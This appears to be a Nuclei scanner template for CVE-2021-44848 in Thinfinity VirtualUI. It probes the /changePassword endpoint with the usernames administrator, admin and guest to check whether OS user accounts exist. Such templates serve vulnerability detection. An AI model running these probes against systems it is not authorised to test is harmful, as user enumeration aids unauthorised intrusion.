id: CVE-2021-44848

info:
  name: User Enumeration
  author: danielmofer
  severity: medium
  description: Thinfinity VirtualUI (before v3.0), /changePassword returns different responses for requests depending on whether the username exists. It may enumerate OS users (Administrator, Guest, etc.) 
  reference:
    - https://github.com/cybelesoft/virtualui/issues/1
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44848
    - https://www.tenable.com/cve/CVE-2021-44848
  tags: cve,cve2021,exposure

requests:
  - raw:
      - |
        GET /changePassword?username=administrator HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /changePassword?username=admin HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /changePassword?username=guest HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers:
      - type: regex
        regex:
          - "rc.*"
        part: body
